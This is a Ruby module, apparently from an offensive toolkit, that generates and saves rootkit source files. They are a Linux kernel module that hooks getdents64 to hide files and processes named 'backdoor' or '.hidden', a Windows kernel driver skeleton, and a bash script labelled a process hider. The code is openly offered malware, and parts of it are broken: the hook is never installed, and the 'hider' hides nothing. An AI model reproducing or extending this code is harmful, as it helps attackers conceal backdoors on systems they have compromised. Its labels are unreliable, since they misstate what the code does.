require_relative '../utils/colorize'

class Rootkit
  def self.generate_linux_rootkit
    rootkit = <<~C
      #include <linux/module.h>
      #include <linux/kernel.h>
      #include <linux/syscalls.h>
      #include <linux/dirent.h>
      #include <linux/fs.h>
      #include <linux/unistd.h>
      
      #define MODULE_NAME "rootkit"
      #define HIDDEN_PROCESS "backdoor"
      #define HIDDEN_FILE ".hidden"
      
      static int hide_process = 0;
      static int hide_file = 0;
      
      asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
      asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
      
      asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
          long ret = original_getdents64(fd, dirp, count);
          struct linux_dirent64 *dir = dirp;
          long pos = 0;
          
          while (pos < ret) {
              if (strstr(dir->d_name, HIDDEN_FILE) || strstr(dir->d_name, HIDDEN_PROCESS)) {
                  long next = dir->d_reclen;
                  memmove(dir, (char *)dir + next, ret - pos - next);
                  ret -= next;
              } else {
                  pos += dir->d_reclen;
                  dir = (struct linux_dirent64 *)((char *)dirp + pos);
              }
          }
          
          return ret;
      }
      
      static int __init rootkit_init(void) {
          printk(KERN_INFO MODULE_NAME ": Loaded\\n");
          return 0;
      }
      
      static void __exit rootkit_exit(void) {
          printk(KERN_INFO MODULE_NAME ": Unloaded\\n");
      }
      
      module_init(rootkit_init);
      module_exit(rootkit_exit);
      MODULE_LICENSE("GPL");
    C
    
    filename = "rootkit_#{Time.now.to_i}.c"
    File.write(filename, rootkit)
    puts Colorize.green("Linux rootkit saved: #{filename}")
    filename
  end

  def self.generate_windows_rootkit
    rootkit = <<~C
      #include <ntddk.h>
      
      #define DEVICE_NAME L"\\\\Device\\\\Rootkit"
      #define SYMLINK_NAME L"\\\\DosDevices\\\\Rootkit"
      
      PDEVICE_OBJECT g_DeviceObject = NULL;
      
      NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
          UNICODE_STRING deviceName, symLinkName;
          NTSTATUS status;
          
          RtlInitUnicodeString(&deviceName, DEVICE_NAME);
          RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);
          
          status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_DeviceObject);
          if (!NT_SUCCESS(status)) {
              return status;
          }
          
          status = IoCreateSymbolicLink(&symLinkName, &deviceName);
          if (!NT_SUCCESS(status)) {
              IoDeleteDevice(g_DeviceObject);
              return status;
          }
          
          DriverObject->DriverUnload = UnloadDriver;
          
          return STATUS_SUCCESS;
      }
      
      VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
          UNICODE_STRING symLinkName;
          RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);
          IoDeleteSymbolicLink(&symLinkName);
          IoDeleteDevice(DriverObject->DeviceObject);
      }
    C
    
    filename = "rootkit_win_#{Time.now.to_i}.c"
    File.write(filename, rootkit)
    puts Colorize.green("Windows rootkit saved: #{filename}")
    filename
  end

  def self.generate_process_hider(process_name)
    hider = <<~SH
      #!/bin/bash
      
      PROCESS="#{process_name}"
      
      while true; do
          PID=$(pgrep -f "$PROCESS" | head -1)
          if [ ! -z "$PID" ]; then
              kill -STOP $PID 2>/dev/null
              kill -CONT $PID 2>/dev/null
          fi
          sleep 1
      done
    SH
    
    filename = "process_hider_#{Time.now.to_i}.sh"
    File.write(filename, hider)
    File.chmod(filename, 0755)
    puts Colorize.green("Process hider saved: #{filename}")
    filename
  end
end

